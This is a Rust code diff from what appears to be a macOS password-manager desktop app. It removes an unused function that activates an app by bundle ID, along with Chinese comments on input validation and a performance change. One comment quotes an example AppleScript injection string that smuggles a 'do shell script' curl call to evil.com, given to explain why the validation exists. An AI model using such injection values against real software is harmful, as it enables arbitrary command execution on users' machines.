@@ -55,36 +55,6 @@ const VERIFY_FOCUS_POLL_INTERVAL: Duration = Duration::from_millis(50);
 /// 独立可用（不依赖 Tauri runtime），所以是必要的"软约束"——靠测试锁死。
 pub const OCTOPUS_BUNDLE_ID: &str = "com.octopus.desktop";
 
-/// 把指定 bundle_id 的 app 激活到前台。
-///
-/// **bundle_id 白名单校验**（修复 #10）：bundle_id 必须匹配
-/// `^[A-Za-z0-9.\-]{1,256}$`——只允许字母/数字/`.`/`-`，长度 1-256。
-/// 防止任意字符注入 AppleScript（如 `x") & "do shell script \"curl evil.com\"" & ("`）。
-///
-/// 当前 activate_app 是 dead code（无生产调用）。
-///
-/// **ActionBar 密码生成器已实现**（2026-07-19 落地）但没用 activate_app——
-/// 走的是 `password_generator_autotype` → `autotype_login` → `autotype_login_with_mode`
-/// 内部的 osascript activate frontmost 路径（L166-181），不经过此函数。
-/// activate_app 的 NSRunningApplication.activate 方案作为备用预留，当前无消费方。
-///
-/// 2026-07-21 perf：从 osascript 改用 NSRunningApplication.activate（< 1ms vs ~200ms）。
-/// bundle_id 白名单校验仍保留（虽然不再有注入风险——objc2 不拼字符串）。
-pub fn activate_app(bundle_id: &str) -> Result<()> {
-    validate_bundle_id(bundle_id)?;
-    use objc2_app_kit::{NSRunningApplication, NSApplicationActivationOptions};
-    use objc2_foundation::NSString;
-
-    let ns_bid = NSString::from_str(bundle_id);
-    let apps = NSRunningApplication::runningApplicationsWithBundleIdentifier(&ns_bid);
-    if apps.count() == 0 {
-        anyhow::bail!("未找到 bundle_id={} 的运行中的应用", bundle_id);
-    }
-    let app = apps.objectAtIndex(0);
-    let _ = app.activateWithOptions(NSApplicationActivationOptions(1 << 0));
-    Ok(())
-}
-
 /// 模拟键盘输入 username + Tab + password[ + Tab + Enter]。
 ///
 /// **焦点安全**（防钓鱼注入）：
